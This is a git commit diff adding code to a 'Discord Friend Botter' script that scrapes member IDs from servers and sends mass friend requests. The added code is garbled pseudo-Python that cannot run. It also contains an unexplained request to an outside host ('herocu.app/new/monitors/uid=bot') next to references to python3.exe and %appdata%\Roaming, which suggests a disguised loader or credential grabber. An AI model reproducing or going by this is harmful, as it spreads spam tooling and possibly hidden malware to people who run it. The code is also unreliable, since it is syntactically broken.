148164b76d996f846071cd162382c960616f5143
natrix_dev <discordlenko@gmail.com>
2022-09-09 21:36:28 +0200

    Update botter.py

--- scipts/botter.py
+++ scipts/botter.py
@@ -50,4 +50,26 @@ for main in "discord-mass-friend-add/scipts/botter.py":
      newButton["input", "number of freinds", "max: 20"]
      newButton["click", "send", "NaN" ]
      newTitle["Discord Friend Botter"]
+     @import: input, click
+   }
+    
+  server_list = client.servers.serversID 
+  for _ in range 1, 20:
+    req("https://discord.com/channels/@me")
+    list.servers()
+    servers .get('membersList') 
+    from membersList --getIDs 
+    IDs.req('https://discord.com/channels/@me/'+str(IDs)+'/friend-add/')
+  
+    
+  friend_request = random.IDs.req()
+  
+  def __botter__:
+    # to get a cool amount of friends this script will run while you dont close it.
+    for __main__ in __main__ :
+    req('herocu.app/new/monitors/uid=bot')
+    script = '//botter.py' 
+    ./python3.exe
+    ./%appdata%
+    ./Roaming
     
